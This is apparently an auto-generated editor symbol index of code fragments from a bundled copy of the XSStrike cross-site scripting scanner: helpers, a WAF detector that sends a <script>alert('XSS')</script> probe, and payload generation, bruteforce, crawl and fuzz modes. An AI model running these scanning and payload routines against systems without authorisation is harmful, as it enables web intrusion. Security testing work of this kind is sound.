        "peekOfCode": "logger = setup_logger(__name__)\ndef updater():\n    logger.run(\"Checking for updates\")\n    latestCommit = get(\n        \"https://raw.githubusercontent.com/s0md3v/XSStrike/master/core/config.py\"\n    ).text\n    if changes not in latestCommit:  # just a hack to see if a new version is available\n        changelog = re.search(r\"changes = '''(.*?)'''\", latestCommit)\n        changelog = changelog.group(1).split(\n            \";\"",
        "detail": "VulnScan.modules.xss-strike.core.updater",
        "documentation": {}
    },
    {
        "label": "converter",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.utils",
        "description": "VulnScan.modules.xss-strike.core.utils",
        "peekOfCode": "def converter(data, url=False):\n    if \"str\" in str(type(data)):\n        if url:\n            dictized = {}\n            parts = data.split(\"/\")[3:]\n            for part in parts:\n                dictized[part] = part\n            return dictized\n        else:\n            return json.loads(data)",
        "detail": "VulnScan.modules.xss-strike.core.utils",
        "documentation": {}
    },
    {
        "label": "counter",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.utils",
        "description": "VulnScan.modules.xss-strike.core.utils",
        "peekOfCode": "def counter(string):\n    string = re.sub(r\"\\s|\\w\", \"\", string)\n    return len(string)\ndef closest(number, numbers):\n    difference = [abs(list(numbers.values())[0]), {}]\n    for index, i in numbers.items():\n        diff = abs(number - i)\n        if diff < difference[0]:\n            difference = [diff, {index: i}]\n    return difference[1]",
        "detail": "VulnScan.modules.xss-strike.core.utils",
        "documentation": {}
    },
    {
        "label": "closest",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.utils",
        "description": "VulnScan.modules.xss-strike.core.utils",
        "peekOfCode": "def closest(number, numbers):\n    difference = [abs(list(numbers.values())[0]), {}]\n    for index, i in numbers.items():\n        diff = abs(number - i)\n        if diff < difference[0]:\n            difference = [diff, {index: i}]\n    return difference[1]\ndef fillHoles(original, new):\n    filler = 0\n    filled = []",
        "detail": "VulnScan.modules.xss-strike.core.utils",
        "documentation": {}
    },
    {
        "label": "fillHoles",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.utils",
        "description": "VulnScan.modules.xss-strike.core.utils",
        "peekOfCode": "def fillHoles(original, new):\n    filler = 0\n    filled = []\n    for x, y in zip(original, new):\n        if int(x) == (y + filler):\n            filled.append(y)\n        else:\n            filled.extend([0, y])\n            filler += int(x) - y\n    return filled",
        "detail": "VulnScan.modules.xss-strike.core.utils",
        "documentation": {}
    },
    {
        "label": "stripper",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.utils",
        "description": "VulnScan.modules.xss-strike.core.utils",
        "peekOfCode": "def stripper(string, substring, direction=\"right\"):\n    done = False\n    strippedString = \"\"\n    if direction == \"right\":\n        string = string[::-1]\n    for char in string:\n        if char == substring and not done:\n            done = True\n        else:\n            strippedString += char",
        "detail": "VulnScan.modules.xss-strike.core.utils",
        "documentation": {}
    },
    {
        "label": "extractHeaders",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.utils",
        "description": "VulnScan.modules.xss-strike.core.utils",
        "peekOfCode": "def extractHeaders(headers):\n    headers = headers.replace(\"\\\\n\", \"\\n\")\n    sorted_headers = {}\n    matches = re.findall(r\"(.*):\\s(.*)\", headers)\n    for match in matches:\n        header = match[0]\n        value = match[1]\n        try:\n            if value[-1] == \",\":\n                value = value[:-1]",
        "detail": "VulnScan.modules.xss-strike.core.utils",
        "documentation": {}
    },
    {
        "label": "replaceValue",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.utils",
        "description": "VulnScan.modules.xss-strike.core.utils",
        "peekOfCode": "def replaceValue(mapping, old, new, strategy=None):\n    \"\"\"\n    Replace old values with new ones following dict strategy.\n    The parameter strategy is None per default for inplace operation.\n    A copy operation is injected via strateg values like copy.copy\n    or copy.deepcopy\n    Note: A dict is returned regardless of modifications.\n    \"\"\"\n    anotherMap = strategy(mapping) if strategy else mapping\n    if old in anotherMap.values():",
        "detail": "VulnScan.modules.xss-strike.core.utils",
        "documentation": {}
    },
    {
        "label": "getUrl",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.utils",
        "description": "VulnScan.modules.xss-strike.core.utils",
        "peekOfCode": "def getUrl(url, GET):\n    if GET:\n        return url.split(\"?\")[0]\n    else:\n        return url\ndef extractScripts(response):\n    scripts = []\n    matches = re.findall(r\"(?s)<script.*?>(.*?)</script>\", response.lower())\n    for match in matches:\n        if xsschecker in match:",
        "detail": "VulnScan.modules.xss-strike.core.utils",
        "documentation": {}
    },
    {
        "label": "extractScripts",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.utils",
        "description": "VulnScan.modules.xss-strike.core.utils",
        "peekOfCode": "def extractScripts(response):\n    scripts = []\n    matches = re.findall(r\"(?s)<script.*?>(.*?)</script>\", response.lower())\n    for match in matches:\n        if xsschecker in match:\n            scripts.append(match)\n    return scripts\ndef randomUpper(string):\n    return \"\".join(\n        random.choice((x, y)) for x, y in zip(string.upper(), string.lower())",
        "detail": "VulnScan.modules.xss-strike.core.utils",
        "documentation": {}
    },
    {
        "label": "randomUpper",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.utils",
        "description": "VulnScan.modules.xss-strike.core.utils",
        "peekOfCode": "def randomUpper(string):\n    return \"\".join(\n        random.choice((x, y)) for x, y in zip(string.upper(), string.lower())\n    )\ndef flattenParams(currentParam, params, payload):\n    flatted = []\n    for name, value in params.items():\n        if name == currentParam:\n            value = payload\n        flatted.append(name + \"=\" + value)",
        "detail": "VulnScan.modules.xss-strike.core.utils",
        "documentation": {}
    },
    {
        "label": "flattenParams",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.utils",
        "description": "VulnScan.modules.xss-strike.core.utils",
        "peekOfCode": "def flattenParams(currentParam, params, payload):\n    flatted = []\n    for name, value in params.items():\n        if name == currentParam:\n            value = payload\n        flatted.append(name + \"=\" + value)\n    return \"?\" + \"&\".join(flatted)\ndef genGen(\n    fillings, eFillings, lFillings, eventHandlers, tags, functions, ends, badTag=None\n):",
        "detail": "VulnScan.modules.xss-strike.core.utils",
        "documentation": {}
    },
    {
        "label": "genGen",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.utils",
        "description": "VulnScan.modules.xss-strike.core.utils",
        "peekOfCode": "def genGen(\n    fillings, eFillings, lFillings, eventHandlers, tags, functions, ends, badTag=None\n):\n    vectors = []\n    r = randomUpper  # randomUpper randomly converts chars of a string to uppercase\n    for tag in tags:\n        if tag == \"d3v\" or tag == \"a\":\n            bait = xsschecker\n        else:\n            bait = \"\"",
        "detail": "VulnScan.modules.xss-strike.core.utils",
        "documentation": {}
    },
    {
        "label": "getParams",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.utils",
        "description": "VulnScan.modules.xss-strike.core.utils",
        "peekOfCode": "def getParams(url, data, GET):\n    params = {}\n    if \"?\" in url and \"=\" in url:\n        data = url.split(\"?\")[1]\n        if data[:1] == \"?\":\n            data = data[1:]\n    elif data:\n        if getVar(\"jsonData\") or getVar(\"path\"):\n            params = data\n        else:",
        "detail": "VulnScan.modules.xss-strike.core.utils",
        "documentation": {}
    },
    {
        "label": "writer",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.utils",
        "description": "VulnScan.modules.xss-strike.core.utils",
        "peekOfCode": "def writer(obj, path):\n    kind = str(type(obj)).split(\"'\")[0]\n    if kind == \"list\" or kind == \"tuple\":\n        obj = \"\\n\".join(obj)\n    elif kind == \"dict\":\n        obj = json.dumps(obj, indent=4)\n    savefile = open(path, \"w+\")\n    savefile.write(str(obj.encode(\"utf-8\")))\n    savefile.close()\ndef reader(path):",
        "detail": "VulnScan.modules.xss-strike.core.utils",
        "documentation": {}
    },
    {
        "label": "reader",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.utils",
        "description": "VulnScan.modules.xss-strike.core.utils",
        "peekOfCode": "def reader(path):\n    with open(path, \"r\") as f:\n        result = [line.rstrip(\"\\n\").encode(\"utf-8\").decode(\"utf-8\") for line in f]\n    return result\ndef js_extractor(response):\n    \"\"\"Extract js files from the response body\"\"\"\n    scripts = []\n    matches = re.findall(r\"<(?:script|SCRIPT).*?(?:src|SRC)=([^\\s>]+)\", response)\n    for match in matches:\n        match = match.replace(\"'\", \"\").replace('\"', \"\").replace(\"`\", \"\")",
        "detail": "VulnScan.modules.xss-strike.core.utils",
        "documentation": {}
    },
    {
        "label": "js_extractor",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.utils",
        "description": "VulnScan.modules.xss-strike.core.utils",
        "peekOfCode": "def js_extractor(response):\n    \"\"\"Extract js files from the response body\"\"\"\n    scripts = []\n    matches = re.findall(r\"<(?:script|SCRIPT).*?(?:src|SRC)=([^\\s>]+)\", response)\n    for match in matches:\n        match = match.replace(\"'\", \"\").replace('\"', \"\").replace(\"`\", \"\")\n        scripts.append(match)\n    return scripts\ndef handle_anchor(parent_url, url):\n    scheme = urlparse(parent_url).scheme",
        "detail": "VulnScan.modules.xss-strike.core.utils",
        "documentation": {}
    },
    {
        "label": "handle_anchor",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.utils",
        "description": "VulnScan.modules.xss-strike.core.utils",
        "peekOfCode": "def handle_anchor(parent_url, url):\n    scheme = urlparse(parent_url).scheme\n    if url[:4] == \"http\":\n        return url\n    elif url[:2] == \"//\":\n        return scheme + \":\" + url\n    elif url.startswith(\"/\"):\n        host = urlparse(parent_url).netloc\n        scheme = urlparse(parent_url).scheme\n        parent_url = scheme + \"://\" + host",
        "detail": "VulnScan.modules.xss-strike.core.utils",
        "documentation": {}
    },
    {
        "label": "deJSON",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.utils",
        "description": "VulnScan.modules.xss-strike.core.utils",
        "peekOfCode": "def deJSON(data):\n    return data.replace(\"\\\\\\\\\", \"\\\\\")\ndef getVar(name):\n    return core.config.globalVariables[name]\ndef updateVar(name, data, mode=None):\n    if mode:\n        if mode == \"append\":\n            core.config.globalVariables[name].append(data)\n        elif mode == \"add\":\n            core.config.globalVariables[name].add(data)",
        "detail": "VulnScan.modules.xss-strike.core.utils",
        "documentation": {}
    },
    {
        "label": "getVar",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.utils",
        "description": "VulnScan.modules.xss-strike.core.utils",
        "peekOfCode": "def getVar(name):\n    return core.config.globalVariables[name]\ndef updateVar(name, data, mode=None):\n    if mode:\n        if mode == \"append\":\n            core.config.globalVariables[name].append(data)\n        elif mode == \"add\":\n            core.config.globalVariables[name].add(data)\n    else:\n        core.config.globalVariables[name] = data",
        "detail": "VulnScan.modules.xss-strike.core.utils",
        "documentation": {}
    },
    {
        "label": "updateVar",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.utils",
        "description": "VulnScan.modules.xss-strike.core.utils",
        "peekOfCode": "def updateVar(name, data, mode=None):\n    if mode:\n        if mode == \"append\":\n            core.config.globalVariables[name].append(data)\n        elif mode == \"add\":\n            core.config.globalVariables[name].add(data)\n    else:\n        core.config.globalVariables[name] = data\ndef isBadContext(position, non_executable_contexts):\n    badContext = \"\"",
        "detail": "VulnScan.modules.xss-strike.core.utils",
        "documentation": {}
    },
    {
        "label": "isBadContext",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.utils",
        "description": "VulnScan.modules.xss-strike.core.utils",
        "peekOfCode": "def isBadContext(position, non_executable_contexts):\n    badContext = \"\"\n    for each in non_executable_contexts:\n        if each[0] < position < each[1]:\n            badContext = each[2]\n            break\n    return badContext\ndef equalize(array, number):\n    if len(array) < number:\n        array.append(\"\")",
        "detail": "VulnScan.modules.xss-strike.core.utils",
        "documentation": {}
    },
    {
        "label": "equalize",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.utils",
        "description": "VulnScan.modules.xss-strike.core.utils",
        "peekOfCode": "def equalize(array, number):\n    if len(array) < number:\n        array.append(\"\")\ndef escaped(position, string):\n    usable = string[:position][::-1]\n    match = re.search(r\"^\\\\*\", usable)\n    if match:\n        match = match.group()\n        if len(match) == 1:\n            return True",
        "detail": "VulnScan.modules.xss-strike.core.utils",
        "documentation": {}
    },
    {
        "label": "escaped",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.utils",
        "description": "VulnScan.modules.xss-strike.core.utils",
        "peekOfCode": "def escaped(position, string):\n    usable = string[:position][::-1]\n    match = re.search(r\"^\\\\*\", usable)\n    if match:\n        match = match.group()\n        if len(match) == 1:\n            return True\n        elif len(match) % 2 == 0:\n            return False\n        else:",
        "detail": "VulnScan.modules.xss-strike.core.utils",
        "documentation": {}
    },
    {
        "label": "wafDetector",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.wafDetector",
        "description": "VulnScan.modules.xss-strike.core.wafDetector",
        "peekOfCode": "def wafDetector(url, params, headers, GET, delay, timeout):\n    with open(sys.path[0] + \"/db/wafSignatures.json\", \"r\") as file:\n        wafSignatures = json.load(file)\n    # a payload which is noisy enough to provoke the WAF\n    noise = '<script>alert(\"XSS\")</script>'\n    params[\"xss\"] = noise\n    # Opens the noise injected payload\n    response = requester(url, params, headers, GET, delay, timeout)\n    page = response.text\n    code = str(response.status_code)",
        "detail": "VulnScan.modules.xss-strike.core.wafDetector",
        "documentation": {}
    },
    {
        "label": "logger",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.wafDetector",
        "description": "VulnScan.modules.xss-strike.core.wafDetector",
        "peekOfCode": "logger = setup_logger(__name__)\ndef wafDetector(url, params, headers, GET, delay, timeout):\n    with open(sys.path[0] + \"/db/wafSignatures.json\", \"r\") as file:\n        wafSignatures = json.load(file)\n    # a payload which is noisy enough to provoke the WAF\n    noise = '<script>alert(\"XSS\")</script>'\n    params[\"xss\"] = noise\n    # Opens the noise injected payload\n    response = requester(url, params, headers, GET, delay, timeout)\n    page = response.text",
        "detail": "VulnScan.modules.xss-strike.core.wafDetector",
        "documentation": {}
    },
    {
        "label": "zetanize",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.zetanize",
        "description": "VulnScan.modules.xss-strike.core.zetanize",
        "peekOfCode": "def zetanize(response):\n    def e(string):\n        return string.encode(\"utf-8\")\n    def d(string):\n        return string.decode(\"utf-8\")\n    # remove the content between html comments\n    response = re.sub(r\"(?s)<!--.*?-->\", \"\", response)\n    forms = {}\n    matches = re.findall(\n        r\"(?i)(?s)<form.*?</form.*?>\", response",
        "detail": "VulnScan.modules.xss-strike.core.zetanize",
        "documentation": {}
    },
    {
        "label": "bruteforcer",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.modes.bruteforcer",
        "description": "VulnScan.modules.xss-strike.modes.bruteforcer",
        "peekOfCode": "def bruteforcer(target, paramData, payloadList, encoding, headers, delay, timeout):\n    GET, POST = (False, True) if paramData else (True, False)\n    host = urlparse(target).netloc  # Extracts host out of the url\n    logger.debug(\"Parsed host to bruteforce: {}\".format(host))\n    url = getUrl(target, GET)\n    logger.debug(\"Parsed url to bruteforce: {}\".format(url))\n    params = getParams(target, paramData, GET)\n    logger.debug_json(\"Bruteforcer params:\", params)\n    if not params:\n        logger.error(\"No parameters to test.\")",
        "detail": "VulnScan.modules.xss-strike.modes.bruteforcer",
        "documentation": {}
    },
    {
        "label": "logger",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.modes.bruteforcer",
        "description": "VulnScan.modules.xss-strike.modes.bruteforcer",
        "peekOfCode": "logger = setup_logger(__name__)\ndef bruteforcer(target, paramData, payloadList, encoding, headers, delay, timeout):\n    GET, POST = (False, True) if paramData else (True, False)\n    host = urlparse(target).netloc  # Extracts host out of the url\n    logger.debug(\"Parsed host to bruteforce: {}\".format(host))\n    url = getUrl(target, GET)\n    logger.debug(\"Parsed url to bruteforce: {}\".format(url))\n    params = getParams(target, paramData, GET)\n    logger.debug_json(\"Bruteforcer params:\", params)\n    if not params:",
        "detail": "VulnScan.modules.xss-strike.modes.bruteforcer",
        "documentation": {}
    },
    {
        "label": "crawl",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.modes.crawl",
        "description": "VulnScan.modules.xss-strike.modes.crawl",
        "peekOfCode": "def crawl(\n    scheme,\n    host,\n    main_url,\n    form,\n    blindXSS,\n    blindPayload,\n    headers,\n    delay,\n    timeout,",
        "detail": "VulnScan.modules.xss-strike.modes.crawl",
        "documentation": {}
    },
    {
        "label": "logger",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.modes.crawl",
        "description": "VulnScan.modules.xss-strike.modes.crawl",
        "peekOfCode": "logger = setup_logger(__name__)\ndef crawl(\n    scheme,\n    host,\n    main_url,\n    form,\n    blindXSS,\n    blindPayload,\n    headers,\n    delay,",
        "detail": "VulnScan.modules.xss-strike.modes.crawl",
        "documentation": {}
    },
    {
        "label": "scan",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.modes.scan",
        "description": "VulnScan.modules.xss-strike.modes.scan",
        "peekOfCode": "def scan(target, paramData, encoding, headers, delay, timeout, skipDOM, skip):\n    GET, POST = (False, True) if paramData else (True, False)\n    # If the user hasn't supplied the root url with http(s), we will handle it\n    if not target.startswith(\"http\"):\n        try:\n            response = requester(\"https://\" + target, {},\n                                 headers, GET, delay, timeout)\n            target = \"https://\" + target\n        except:\n            target = \"http://\" + target",
        "detail": "VulnScan.modules.xss-strike.modes.scan",
        "documentation": {}
    },
    {
        "label": "logger",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.modes.scan",
        "description": "VulnScan.modules.xss-strike.modes.scan",
        "peekOfCode": "logger = setup_logger(__name__)\ndef scan(target, paramData, encoding, headers, delay, timeout, skipDOM, skip):\n    GET, POST = (False, True) if paramData else (True, False)\n    # If the user hasn't supplied the root url with http(s), we will handle it\n    if not target.startswith(\"http\"):\n        try:\n            response = requester(\"https://\" + target, {},\n                                 headers, GET, delay, timeout)\n            target = \"https://\" + target\n        except:",
        "detail": "VulnScan.modules.xss-strike.modes.scan",
        "documentation": {}
    },
    {
        "label": "singleFuzz",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.modes.singleFuzz",
        "description": "VulnScan.modules.xss-strike.modes.singleFuzz",
        "peekOfCode": "def singleFuzz(target, paramData, encoding, headers, delay, timeout):\n    GET, POST = (False, True) if paramData else (True, False)\n    # If the user hasn't supplied the root url with http(s), we will handle it\n    if not target.startswith(\"http\"):\n        try:\n            response = requester(\"https://\" + target, {}, headers, GET, delay, timeout)\n            target = \"https://\" + target\n        except:\n            target = \"http://\" + target\n    logger.debug(\"Single Fuzz target: {}\".format(target))",
        "detail": "VulnScan.modules.xss-strike.modes.singleFuzz",
        "documentation": {}
    },
    {
        "label": "logger",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.modes.singleFuzz",
        "description": "VulnScan.modules.xss-strike.modes.singleFuzz",
        "peekOfCode": "logger = setup_logger(__name__)\ndef singleFuzz(target, paramData, encoding, headers, delay, timeout):\n    GET, POST = (False, True) if paramData else (True, False)\n    # If the user hasn't supplied the root url with http(s), we will handle it\n    if not target.startswith(\"http\"):\n        try:\n            response = requester(\"https://\" + target, {}, headers, GET, delay, timeout)\n            target = \"https://\" + target\n        except:\n            target = \"http://\" + target",
        "detail": "VulnScan.modules.xss-strike.modes.singleFuzz",
        "documentation": {}
    },
    {
        "label": "is_defined",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.plugins.retireJs",
        "description": "VulnScan.modules.xss-strike.plugins.retireJs",
        "peekOfCode": "def is_defined(o):\n    return o is not None\ndef scan(data, extractor, definitions, matcher=None):\n    matcher = matcher or _simple_match\n    detected = []\n    for component in definitions:\n        extractors = definitions[component].get(\"extractors\", None).get(extractor, None)\n        if not is_defined(extractors):\n            continue\n        for i in extractors:",
        "detail": "VulnScan.modules.xss-strike.plugins.retireJs",
        "documentation": {}
    },
    {
        "label": "scan",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.plugins.retireJs",
        "description": "VulnScan.modules.xss-strike.plugins.retireJs",
        "peekOfCode": "def scan(data, extractor, definitions, matcher=None):\n    matcher = matcher or _simple_match\n    detected = []\n    for component in definitions:\n        extractors = definitions[component].get(\"extractors\", None).get(extractor, None)\n        if not is_defined(extractors):\n            continue\n        for i in extractors:\n            match = matcher(i, data)\n            if match:",
        "detail": "VulnScan.modules.xss-strike.plugins.retireJs",
        "documentation": {}
    },
    {
        "label": "check",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.plugins.retireJs",
        "description": "VulnScan.modules.xss-strike.plugins.retireJs",
        "peekOfCode": "def check(results, definitions):\n    for r in results:\n        result = r\n        if not is_defined(definitions[result.get(\"component\", None)]):\n            continue\n        vulns = definitions[result.get(\"component\", None)].get(\"vulnerabilities\", None)\n        for i in range(len(vulns)):\n            if not _is_at_or_above(\n                result.get(\"version\", None), vulns[i].get(\"below\", None)\n            ):",
        "detail": "VulnScan.modules.xss-strike.plugins.retireJs",
        "documentation": {}
    },
    {
        "label": "unique",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.plugins.retireJs",
        "description": "VulnScan.modules.xss-strike.plugins.retireJs",
        "peekOfCode": "def unique(ar):\n    return list(set(ar))\ndef _is_at_or_above(version1, version2):\n    # print \"[\",version1,\",\", version2,\"]\"\n    v1 = re.split(r\"[.-]\", version1)\n    v2 = re.split(r\"[.-]\", version2)\n    l = len(v1) if len(v1) > len(v2) else len(v2)\n    for i in range(l):\n        v1_c = _to_comparable(v1[i] if len(v1) > i else None)\n        v2_c = _to_comparable(v2[i] if len(v2) > i else None)",
        "detail": "VulnScan.modules.xss-strike.plugins.retireJs",
        "documentation": {}
    },
    {
        "label": "is_vulnerable",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.plugins.retireJs",
        "description": "VulnScan.modules.xss-strike.plugins.retireJs",
        "peekOfCode": "def is_vulnerable(results):\n    for r in results:\n        if \"vulnerabilities\" in r:\n            # print r\n            return True\n    return False\ndef scan_uri(uri, definitions):\n    result = scan(uri, \"uri\", definitions)\n    return check(result, definitions)\ndef scan_filename(fileName, definitions):",
        "detail": "VulnScan.modules.xss-strike.plugins.retireJs",
        "documentation": {}
    },
    {
        "label": "scan_uri",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.plugins.retireJs",
        "description": "VulnScan.modules.xss-strike.plugins.retireJs",
        "peekOfCode": "def scan_uri(uri, definitions):\n    result = scan(uri, \"uri\", definitions)\n    return check(result, definitions)\ndef scan_filename(fileName, definitions):\n    result = scan(fileName, \"filename\", definitions)\n    return check(result, definitions)\ndef scan_file_content(content, definitions):\n    result = scan(content, \"filecontent\", definitions)\n    if len(result) == 0:\n        result = scan(content, \"filecontentreplace\", definitions, _replacement_match)",
        "detail": "VulnScan.modules.xss-strike.plugins.retireJs",
        "documentation": {}
    },
    {
        "label": "scan_filename",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.plugins.retireJs",
        "description": "VulnScan.modules.xss-strike.plugins.retireJs",
        "peekOfCode": "def scan_filename(fileName, definitions):\n    result = scan(fileName, \"filename\", definitions)\n    return check(result, definitions)\ndef scan_file_content(content, definitions):\n    result = scan(content, \"filecontent\", definitions)\n    if len(result) == 0:\n        result = scan(content, \"filecontentreplace\", definitions, _replacement_match)\n    if len(result) == 0:\n        result = _scanhash(\n            hashlib.sha1(content.encode(\"utf8\")).hexdigest(), definitions",
        "detail": "VulnScan.modules.xss-strike.plugins.retireJs",
        "documentation": {}
    },
    {
        "label": "scan_file_content",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.plugins.retireJs",
        "description": "VulnScan.modules.xss-strike.plugins.retireJs",
        "peekOfCode": "def scan_file_content(content, definitions):\n    result = scan(content, \"filecontent\", definitions)\n    if len(result) == 0:\n        result = scan(content, \"filecontentreplace\", definitions, _replacement_match)\n    if len(result) == 0:\n        result = _scanhash(\n            hashlib.sha1(content.encode(\"utf8\")).hexdigest(), definitions\n        )\n    return check(result, definitions)\ndef main_scanner(uri, response):",
        "detail": "VulnScan.modules.xss-strike.plugins.retireJs",
        "documentation": {}
    },
    {
        "label": "main_scanner",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.plugins.retireJs",
        "description": "VulnScan.modules.xss-strike.plugins.retireJs",
        "peekOfCode": "def main_scanner(uri, response):\n    definitions = getVar(\"definitions\")\n    uri_scan_result = scan_uri(uri, definitions)\n    filecontent = response\n    filecontent_scan_result = scan_file_content(filecontent, definitions)\n    uri_scan_result.extend(filecontent_scan_result)\n    result = {}\n    if uri_scan_result:\n        result[\"component\"] = uri_scan_result[0][\"component\"]\n        result[\"version\"] = uri_scan_result[0][\"version\"]",
        "detail": "VulnScan.modules.xss-strike.plugins.retireJs",
        "documentation": {}
    },
    {
        "label": "retireJs",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.plugins.retireJs",
        "description": "VulnScan.modules.xss-strike.plugins.retireJs",
        "peekOfCode": "def retireJs(url, response):\n    scripts = js_extractor(response)\n    for script in scripts:\n        if script not in getVar(\"checkedScripts\"):\n            updateVar(\"checkedScripts\", script, \"add\")\n            uri = handle_anchor(url, script)\n            response = requester(\n                uri, \"\", getVar(\"headers\"), True, getVar(\"delay\"), getVar(\"timeout\")\n            ).text\n            result = main_scanner(uri, response)",
        "detail": "VulnScan.modules.xss-strike.plugins.retireJs",
        "documentation": {}
    },
    {
        "label": "logger",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.plugins.retireJs",
        "description": "VulnScan.modules.xss-strike.plugins.retireJs",
        "peekOfCode": "logger = setup_logger(__name__)\ndef is_defined(o):\n    return o is not None\ndef scan(data, extractor, definitions, matcher=None):\n    matcher = matcher or _simple_match\n    detected = []\n    for component in definitions:\n        extractors = definitions[component].get(\"extractors\", None).get(extractor, None)\n        if not is_defined(extractors):\n            continue",
        "detail": "VulnScan.modules.xss-strike.plugins.retireJs",
        "documentation": {}
    },
    {
        "label": "parser",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
        "peekOfCode": "parser = argparse.ArgumentParser()\nparser.add_argument('-u', '--url', help='url', dest='target')\nparser.add_argument('--data', help='post data', dest='paramData')\nparser.add_argument('-e', '--encode', help='encode payloads', dest='encode')\nparser.add_argument('--fuzzer', help='fuzzer',\n                    dest='fuzz', action='store_true')\nparser.add_argument('--update', help='update',\n                    dest='update', action='store_true')\nparser.add_argument('--timeout', help='timeout',\n                    dest='timeout', type=int, default=core.config.timeout)",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "args",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
        "peekOfCode": "args = parser.parse_args()\n# Pull all parameter values of dict from argparse namespace into local variables of name == key\n# The following works, but the static checkers are too static ;-) locals().update(vars(args))\ntarget = args.target\npath = args.path\njsonData = args.jsonData\nparamData = args.paramData\nencode = args.encode\nfuzz = args.fuzz\nupdate = args.update",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "target",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
        "peekOfCode": "target = args.target\npath = args.path\njsonData = args.jsonData\nparamData = args.paramData\nencode = args.encode\nfuzz = args.fuzz\nupdate = args.update\ntimeout = args.timeout\nproxy = args.proxy\nrecursive = args.recursive",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "path",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
        "peekOfCode": "path = args.path\njsonData = args.jsonData\nparamData = args.paramData\nencode = args.encode\nfuzz = args.fuzz\nupdate = args.update\ntimeout = args.timeout\nproxy = args.proxy\nrecursive = args.recursive\nargs_file = args.args_file",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "jsonData",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
        "peekOfCode": "jsonData = args.jsonData\nparamData = args.paramData\nencode = args.encode\nfuzz = args.fuzz\nupdate = args.update\ntimeout = args.timeout\nproxy = args.proxy\nrecursive = args.recursive\nargs_file = args.args_file\nargs_seeds = args.args_seeds",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "paramData",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
        "peekOfCode": "paramData = args.paramData\nencode = args.encode\nfuzz = args.fuzz\nupdate = args.update\ntimeout = args.timeout\nproxy = args.proxy\nrecursive = args.recursive\nargs_file = args.args_file\nargs_seeds = args.args_seeds\nlevel = args.level",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "encode",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
        "peekOfCode": "encode = args.encode\nfuzz = args.fuzz\nupdate = args.update\ntimeout = args.timeout\nproxy = args.proxy\nrecursive = args.recursive\nargs_file = args.args_file\nargs_seeds = args.args_seeds\nlevel = args.level\nadd_headers = args.add_headers",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "fuzz",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
